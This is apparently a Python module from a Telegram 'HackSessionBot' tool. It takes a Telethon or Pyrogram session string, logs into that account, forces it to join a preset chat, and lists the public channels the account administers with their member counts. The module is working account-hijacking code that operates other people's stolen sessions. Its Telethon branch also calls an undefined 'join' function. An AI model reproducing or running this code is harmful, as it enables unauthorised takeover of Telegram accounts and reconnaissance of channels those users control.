from pyrogram import Client
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from HackSessionBot import (
     API_ID,
     API_HASH,
     CHAT )
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest


async def users_gc(session):
    err = ""
    msg = ""
    if session.endswith("="):
        async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
            try:
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                k = await steve(GetAdminedPublicChannelsRequest())            
                for x in k.chats:
                    try:
                        msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
                    except:
                        pass
            except Exception as idk:
                err += str(idk)
    else:    
        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
            try:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
                     
            except Exception as idk:
                err += str(idk)                    
    if err:
        return err
    return msg
       
